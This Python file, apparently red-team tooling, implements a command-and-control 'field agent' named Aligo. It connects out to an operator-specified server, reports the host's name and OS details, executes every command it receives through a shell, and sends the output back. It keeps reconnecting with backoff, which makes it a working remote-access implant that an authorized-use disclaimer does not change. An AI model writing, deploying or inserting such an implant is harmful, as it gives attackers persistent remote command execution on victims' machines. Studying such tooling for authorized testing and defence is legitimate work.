"""
Aligo C2 Client — Field Agent
Production-grade socket client that connects to the C2 server,
identifies itself, and executes commands received remotely.

Usage:
    python c2_client.py --server <ip> --port <port>

Security Notice:
    For authorized Red Team operations ONLY. 
    Use only in isolated lab environments or with explicit written consent.
"""
import socket
import subprocess
import platform
import time
import json
import argparse
import logging
import signal
import sys
import uuid
from datetime import datetime

# ── Logging ────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("c2-client")

# ── Config ─────────────────────────────────────────────
DEFAULT_SERVER_IP   = "127.0.0.1"
DEFAULT_SERVER_PORT = 1234
RECONNECT_BASE_DELAY = 5   # seconds
RECONNECT_MAX_DELAY  = 120 # seconds — exponential backoff cap
BUFFER_SIZE = 4096
AGENT_ID = str(uuid.uuid4())[:8]  # Short unique agent identifier

# ── Signal handler: graceful shutdown ──────────────────
_running = True

def handle_signal(sig, frame):
    global _running
    log.warning("Shutdown signal received. Closing connection...")
    _running = False
    sys.exit(0)

signal.signal(signal.SIGINT,  handle_signal)
signal.signal(signal.SIGTERM, handle_signal)


def gather_system_info() -> dict:
    """Collect host metadata to send to the C2 server on connection."""
    return {
        "agent_id":  AGENT_ID,
        "hostname":  platform.node(),
        "os":        platform.system(),
        "os_ver":    platform.version(),
        "arch":      platform.machine(),
        "python":    platform.python_version(),
        "connected": datetime.utcnow().isoformat() + "Z",
    }


def execute_command(command: str) -> str:
    """Run a shell command and return its output (stdout + stderr)."""
    try:
        result = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=30,    # Prevent hanging commands
        )
        return result.strip() or "[+] Command executed successfully (no output)."
    except subprocess.CalledProcessError as e:
        return f"[!] Command failed (exit {e.returncode}):\n{e.output}"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out after 30s."
    except Exception as e:
        return f"[!] Execution error: {e}"


def connect_and_run(server_ip: str, server_port: int):
    """Main connection loop with exponential backoff reconnection."""
    global _running
    delay = RECONNECT_BASE_DELAY

    while _running:
        sock = None
        try:
            log.info(f"Connecting to C2 server at {server_ip}:{server_port} ...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((server_ip, server_port))
            sock.settimeout(None)  # Remove timeout once connected

            log.info("[+] Connected to C2 server.")
            delay = RECONNECT_BASE_DELAY  # Reset backoff on success

            # Send agent identification handshake
            sys_info = gather_system_info()
            sock.sendall((json.dumps(sys_info) + "\n").encode("utf-8"))
            log.info(f"[+] Sent agent ID: {AGENT_ID} | Host: {sys_info['hostname']} | OS: {sys_info['os']}")

            # Main command receive-execute-respond loop
            while _running:
                raw = sock.recv(BUFFER_SIZE)
                if not raw:
                    log.warning("[-] Server closed the connection.")
                    break

                command = raw.decode("utf-8", errors="replace").strip()
                log.info(f"[*] Command received: {command!r}")

                if command.lower() in ("quit", "exit", "bye"):
                    log.info("[+] Disconnect command received. Exiting.")
                    _running = False
                    break

                output = execute_command(command)
                log.info(f"[*] Sending output ({len(output)} bytes)...")
                sock.sendall(output.encode("utf-8"))

        except (ConnectionRefusedError, socket.timeout):
            log.error(f"[-] Could not connect. Retrying in {delay}s...")
        except ConnectionResetError:
            log.warning("[-] Connection reset by server. Reconnecting...")
        except OSError as e:
            log.error(f"[-] Socket error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

        if _running:
            log.info(f"Waiting {delay}s before reconnecting...")
            time.sleep(delay)
            # Exponential backoff: 5s → 10s → 20s → ... → 120s max
            delay = min(delay * 2, RECONNECT_MAX_DELAY)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Aligo C2 Field Agent — connects to a C2 server and executes commands."
    )
    parser.add_argument("--server", default=DEFAULT_SERVER_IP,  help="C2 server IP address")
    parser.add_argument("--port",   default=DEFAULT_SERVER_PORT, type=int, help="C2 server port")
    args = parser.parse_args()

    log.info(f"=== Aligo C2 Agent [{AGENT_ID}] ===")
    log.info(f"Target: {args.server}:{args.port}")
    connect_and_run(args.server, args.port)
